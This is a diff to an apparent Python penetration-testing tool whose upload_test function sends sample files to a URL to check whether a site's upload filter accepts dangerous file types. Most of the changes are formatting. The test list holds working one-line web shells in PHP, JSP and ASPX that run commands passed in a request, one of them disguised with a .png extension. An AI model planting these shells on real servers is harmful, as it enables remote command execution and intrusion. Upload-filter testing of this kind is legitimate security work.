@@ -6,14 +6,18 @@ import subprocess
 import tempfile
 from typing import Any
 
-from mcp_servers.tools._common import SUBPROCESS_ENV, WORKSPACE_DIR, safe_filename, save_to_workspace, sanitize_input
+from mcp_servers.tools._common import SUBPROCESS_ENV, safe_filename, save_to_workspace, sanitize_input
 
 
 _TEST_FILES = [
     ("shell.php",      b"<?php system($_GET['cmd']); ?>",       "application/x-php"),
     ("shell.php.png",  b"<?php system($_GET['cmd']); ?>",       "image/png"),
     ("shell.jsp",      b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', "application/octet-stream"),
-    ("shell.aspx",     b"<%@ Page Language=\"C#\" %><% Response.Write(System.Diagnostics.Process.Start(\"cmd\")); %>", "application/octet-stream"),
+    (
+        "shell.aspx",
+        b"<%@ Page Language=\"C#\" %><% Response.Write(System.Diagnostics.Process.Start(\"cmd\")); %>",
+        "application/octet-stream",
+    ),
     ("safe.png",       b"\x89PNG\r\n\x1a\n" + b"\x00" * 16,    "image/png"),
 ]
 
@@ -55,7 +59,11 @@ def upload_test(url: str, field: str = "file") -> dict[str, Any]:
 
     accepted = [r["file"] for r in results if r.get("accepted")]
     summary = f"Accepted: {accepted}" if accepted else "No dangerous file types accepted"
-    out = "\n".join(f"{r['file']}: {r.get('http_code','ERR')} ({'ACCEPTED' if r.get('accepted') else 'rejected'})" for r in results)
+    out = "\n".join(
+        f"{r['file']}: {r.get('http_code', 'ERR')} "
+        f"({'ACCEPTED' if r.get('accepted') else 'rejected'})"
+        for r in results
+    )
     log_path = save_to_workspace(safe_filename(url, "upload_test"), out)
 
     return {
